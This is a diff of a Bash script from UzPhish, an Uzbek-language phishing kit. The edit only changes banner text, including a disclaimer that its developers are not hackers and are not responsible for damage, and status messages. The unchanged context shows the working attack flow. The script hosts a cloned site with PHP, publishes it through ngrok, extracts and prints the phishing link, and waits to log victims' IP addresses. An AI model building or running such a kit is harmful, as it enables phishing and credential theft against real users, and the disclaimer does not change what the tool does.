@@ -79,8 +79,8 @@ printf "\e[1;77m    \_______/   /_______\|_|      |_| |_||_|(___/ |_| |_| v1.1\e
 printf "\n"
 printf "\e[1;93m       .:.:.\e[0m\e[1;77m  Yaratuvchi: UzbekMind \e[0m\e[1;93m.:.:.\e[0m\n"
 printf "\n"
-printf "  \e[101m\e[1;77m:: Diqqat: Dasturchilar hacker emas, ularni qo'llamaydilar ham    ::\e[0m\n"
-printf "  \e[101m\e[1;77m::  UzPhish tomonidan yetkazilgan zarar uchun javobgar emaslar! ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: Diqqat: Dasturchilar hacker emas, ularni qo'llamaydilar ham!    ::\e[0m\n"
+printf "  \e[101m\e[1;77m:: UzPhish tomonidan yetkazilgan zarar uchun ular javobgar emas! ::\e[0m\n"
 printf "\n"
 }
 
@@ -245,26 +245,26 @@ fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] php server ishga tushmoqda...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] [!]Php server ishga tushmoqda...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] ngrok server ishga tushmoqda...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] [!]Ngrok server ishga tushmoqda...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] fishing sayt havolasi:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] [!]Fishing sayt havolasi:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
 checkfound() {
 
 
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Havolani ochilishini kutamiz ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] [?]Havolani ochilishini kutamiz ...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "sites/$server/ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m*\e[1;92m] IP manzil topildi!\n"
+printf "\n\e[1;92m[\e[0m*\e[1;92m] [!] IP manzil topildi!\n"
 catch_ip
 
 fi
